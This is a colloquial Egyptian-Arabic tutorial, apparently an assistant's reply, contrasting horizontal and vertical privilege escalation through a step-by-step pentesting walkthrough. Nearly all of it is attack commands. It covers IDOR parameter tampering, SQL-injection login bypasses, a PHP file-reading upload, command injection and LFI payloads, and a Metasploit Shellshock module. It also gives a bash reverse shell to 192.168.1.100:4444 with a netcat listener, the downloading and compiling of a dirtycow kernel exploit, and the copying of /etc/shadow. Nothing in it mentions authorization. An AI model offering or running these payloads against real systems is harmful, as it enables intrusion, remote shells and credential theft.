تمام، هشرح لك "Differences between Horizontal Privilege Escalation and Vertical Privilege Escalation" بعمق شديد مع تركيز على الجانب العملي، الأوامر، والأكواد. هخلّص كل جزء بالعامية المصرية زي ما تكون بتسمع من واحد صاحبك، وفي الآخر هقدم خطوات عملية للاستغلال في سياق Pentesting.

---

### **1. Horizontal Privilege Escalation (التصعيد الأفقي)**

#### **الشرح العميق:**
التصعيد الأفقي بيحصل لما تكون داخل نظام أو تطبيق كمستخدم عادي (low privilege user) وتقدر توصل لصلاحيات أو بيانات مستخدم عادي تاني على نفس المستوى بتاعك بدون ما تطلع لمستوى أعلى زي الأدمن. الهدف هنا مش التحكم الكامل في النظام، لكن الوصول لموارد أو حسابات المفروض ماتكونش تحت إيدك. في الويب، ده بيحصل كتير بسبب ثغرات زي ضعف التحقق من الهوية (Broken Access Control) أو سوء تصميم الـ Session Management.

#### **الأدوات والأوامر العملية:**
1. **تجربة Parameter Tampering:**
   - لو موقع فيه رابط زي: `http://example.com/profile?user_id=123`
   - عدّل الـ `user_id` لـ `124` أو `1`:
     - `http://example.com/profile?user_id=124`
   - لو فتح حساب مستخدم تاني (زي حساب زميلك)، يبقى ده تصعيد أفقي.
   - أداة: Burp Suite (Intercept الطلب وعدّل الـ Parameter).

2. **Cookie Manipulation:**
   - لو الموقع بيعتمد على كوكيز:
     - افتح المتصفح، اضغط F12، روح لـ Application -> Cookies.
     - لو لقيت حاجة زي `session=abc123`، جرب كوكيز حد تاني (لو عندك طريقة تجيبها).
     - أمر في Burp: غيّر الـ Cookie في الـ Request وشوف النتيجة.

3. **SQL Injection للوصول لحسابات:**
   - لو فيه Login Page، جرب:
     - Username: `admin' OR user_id=2 --`
     - Password: أي حاجة.
   - لو دخلت على حساب مستخدم تاني مش الأدمن، ده أفقي.

4. **مثال يدوي:**
   - لو موقع بيسمح تحميل ملفات، ارفع ملف PHP بسيط:
     - `<?php echo file_get_contents('/home/user2/data.txt'); ?>`
   - لو شفت بيانات مستخدم تاني، ده تصعيد أفقي.

#### **خلاصة بالعامية المصرية:**
"يعني أنت جوا البيت كضيف، ومش هتبقى صاحب البيت، بس قدرت تفتح دولاب الضيف التاني وتشوف هدومه أو تاخد حاجته. زي ما تكون بتتنطط بين الجيران من غير ما تبقى الباشا بتاع العمارة!"

---

### **2. Vertical Privilege Escalation (التصعيد العمودي)**

#### **الشرح العميق:**
التصعيد العمودي بيحصل لما تكون مستخدم عادي وتطلع لمستوى أعلى زي الأدمن أو root على النظام كله. هنا الهدف هو التحكم الكامل، مش بس التنقل بين المستخدمين. في الويب، ده بيحصل من ثغرات زي Command Injection، سوء إعدادات السيرفر، أو استغلال برامج قديمة (outdated software). لما توصل للمستوى ده، تقدر تعمل أي حاجة: تشغل أوامر، تسرق بيانات، أو تدمر النظام.

#### **الأدوات والأوامر العملية:**
1. **Command Injection:**
   - لو موقع فيه حقل بياخد إدخال زي `http://example.com/ping?ip=127.0.0.1`:
     - جرب: `http://example.com/ping?ip=127.0.0.1; id`
     - لو رجعلك `uid=33(www-data)`، حاول تصعد:
     - `http://example.com/ping?ip=127.0.0.1; sudo -l`
   - لو نجحت، جرب أمر زي `sudo /bin/bash`.

2. **LFI (Local File Inclusion):**
   - رابط: `http://example.com?page=about.php`
   - جرب: `http://example.com?page=/etc/passwd`
   - لو نجح، حاول تشغل أوامر:
     - `http://example.com?page=/proc/self/environ` (شوف متغيرات النظام).
   - لو لقيت طريقة تحقن shell، تصعد لـ root.

3. **Metasploit للتصعيد:**
   - افتح: `msfconsole`
   - لو لقيت ثغرة في خدمة زي Apache:
     - `use exploit/multi/http/apache_mod_cgi_bash_env_exec`
     - `set RHOST 192.168.1.10`
     - `exploit`
   - لو نجحت، هتاخد shell، شغل `id`، وبعدها ابحث عن تصعيد.

4. **Kernel Exploits:**
   - لو وصلت لـ shell كـ www-data:
     - `uname -r` (مثلاً 2.6.32).
     - `searchsploit linux kernel 2.6.32`
     - نزل السكربت (مثل dirtycow)، ارفعه على السيرفر، وشغله:
       - `./dirtycow`
     - لو نجح، هتبقى root.

#### **خلاصة بالعامية المصرية:**
"يعني أنت كنت ضيف في البيت، بس لقيت السلم السري وطلعت لأوضة صاحب البيت، وخدت مفتاح العمارة كلها! هنا أنت مش بتلعب مع الجيران، أنت بقيت الباشا بتاع كل حاجة!"

---

### **3. الفرق العملي والتأثير**
- **Horizontal:**
  - التأثير: محدود، بتوصل لبيانات مستخدمين تانيين، لكن مش بتتحكم في النظام.
  - الخطر: سرقة بيانات، انتحال شخصية، أو جمع معلومات لخطوة أكبر.
- **Vertical:**
  - التأثير: كبير جدًا، بتاخد السيطرة الكاملة على السيرفر أو الموقع.
  - الخطر: تدمير النظام، تسريب كل البيانات، أو زرع أكواد ضارة.

#### **خلاصة بالعامية المصرية:**
"الأفقي زي ما تكون بتلف في الدور الأول بين الأوض، بس العمودي يعني طلعت للسطح ومسكت العمارة كلها بإيدك! الفرق إن الأول بتلعب في الصغير، والتاني بتبقى الكبير بجد."

---

### **خطوات عملية للاستغلال في Pentesting**

#### **الخطوة 1: فحص الهدف**
- شغل Nmap:
  - `nmap -sV 192.168.1.10`
- افترض النتيجة:
  - Port 80: Apache 2.4.29
  - Port 22: OpenSSH 5.3

#### **الخطوة 2: اختبار التصعيد الأفقي**
- جرب Parameter Tampering:
  - `http://192.168.1.10/profile?user_id=123`
  - عدلها لـ: `http://192.168.1.10/profile?user_id=124`
  - لو فتحت حساب مستخدم تاني، سجل البيانات (زي الإيميل أو كلمة السر).
- جرب SQL Injection:
  - في Login Page: Username: `user' OR user_id=2 --`
  - لو دخلت حساب مستخدم تاني، ده أفقي.

#### **الخطوة 3: اختبار التصعيد العمودي**
- جرب Command Injection:
  - `http://192.168.1.10/ping?ip=127.0.0.1; id`
  - لو رجعلك `www-data`، جرب:
    - `http://192.168.1.10/ping?ip=127.0.0.1; /bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1`
  - على جهازك: `nc -lvnp 4444` (هتاخد shell).
- لو وصلت لـ shell:
  - `id` (مثلاً www-data).
  - `sudo -l` (لو لقيت أوامر زي `sudo /bin/bash`، شغلها).

#### **الخطوة 4: تصعيد عمودي كامل**
- لو ما لقيتش sudo:
  - `uname -r` (مثلاً 2.6.32).
  - `searchsploit linux kernel 2.6.32`
  - نزل exploit (زي dirtycow)، ارفعه:
    - `wget http://192.168.1.100/dirtycow.c -O /tmp/dc.c`
    - `gcc /tmp/dc.c -o /tmp/dc`
    - `./tmp/dc`
  - لو نجح، `id` هيرجعلك `uid=0(root)`.

#### **الخطوة 5: استغلال وتوثيق**
- الأفقي: استخدم البيانات اللي جمعتها (زي كلمات سر) لتجرب حسابات تانية.
- العمودي: لو وصلت root، سجل كل حاجة، وخد نسخة من الملفات الحساسة (زي `/etc/shadow`).
- رجّع تقرير للعميل بكل اللي عملته.

#### **خلاصة بالعامية المصرية:**
"الأفقي زي ما تكون بتسرق شنطة جارك، والعمودي زي ما تكون خدت مفتاح العمارة كلها! في الـ Pentesting، ابدأ بالأفقي عشان تجمع معلومات، وبعدها اطلع عمودي عشان تبقى الكبير!"

---

### **الخلاصة النهائية:**
التصعيد الأفقي بيديك وصول لنفس المستوى (زي مستخدمين تانيين)، والعمودي بيخليك تسيطر على النظام كله (زي root). بالأدوات زي Burp، Nmap، وMetasploit، تقدر تكتشف الثغرات وتستغلها. ابدأ بالأفقي عشان تجمع بيانات، وبعدها اركب العمودي عشان تبقى البطل بتاع اللعبة!